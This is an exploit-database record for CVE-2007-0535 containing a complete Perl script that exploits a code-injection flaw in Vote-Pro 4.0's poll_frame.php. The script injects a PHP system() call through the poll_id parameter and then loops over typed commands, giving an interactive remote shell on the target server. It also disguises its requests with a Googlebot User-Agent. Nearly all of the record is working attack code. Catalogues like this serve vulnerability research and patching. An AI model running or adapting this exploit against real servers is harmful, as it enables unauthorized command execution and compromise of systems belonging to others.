{
  "id": "3180",
  "title": "Vote-Pro 4.0 - &#039;poll_frame.php?poll_id&#039; Remote Code Execution",
  "cve": "CVE-2007-0535",
  "vuln_type": "rce",
  "code": "#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                          Vote-Pro Code Injection 0day Exploit                                 #\r\n#################################################################################################\r\n# Software: Vote-Pro 4.0                                                                        #\r\n#                                                                                               #\r\n# Vendor: http://www.vote-pro.com/                                                              #\r\n#                                                                                               #\r\n# Released: 2007/01/23                                                                          #\r\n#                                                                                               #\r\n# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for Vote-Pro administrator                 #\r\n# testing purposes only!                                                                        #\r\n#################################################################################################\r\n\r\nuse IO::Socket;\r\n\r\n$port = \"80\"; # connection port\r\n$target = shift; # vote-pro.com\r\n$folder = shift; # /votepro/\r\n\r\nsub Header()\r\n{\r\n\tprint q\r\n\t{Vote-Pro Code Injection Exploit - writ3r [at] gmail.com\r\n-------------------------------------------------------\r\n};\r\n}\r\n\r\nsub Usage()\r\n{\r\n\tprint q\r\n\t{\r\nUsage: votecmd.pl [target] [directory]\r\nExample: votecmd.pl vote-pro.com /votepro/\r\n};\r\n\texit();\r\n}\r\n\r\nHeader();\r\n\r\nif (!$target || !$folder) {\r\n\tUsage(); }\r\n\r\nprint \"[+] Connecting...\\n\";\r\n$cmd = \"dir\";\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n\t$xpack = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect on exploit attempt. Exiting...\\r\\n\";\r\n\tprint $xpack \"GET \".$folder.\"poll_frame.php?poll_id=hyphy;system($_GET[com]);&com=\".substr($cmd, 0, -1).\"; HTTP/1.1\\n\";\r\n\tprint $xpack \"Host: $target\\n\";\r\n\tprint $xpack \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\n\tprint $xpack \"Accept: text/html\\n\";\r\n\tprint $xpack \"Connection: keep-alive\\n\\n\";\r\n\r\n\tprint \"[cmd]\\$ \";\r\n\t$cmd = <STDIN>;\r\n\t$cmd =~ s/ /%20/g;\r\n}\r\n\r\nprint \"[!] Connection to host lost...\\n\";\r\n\r\n# milw0rm.com [2007-01-23]",
  "url": "https://www.exploit-db.com/exploits/3180"
}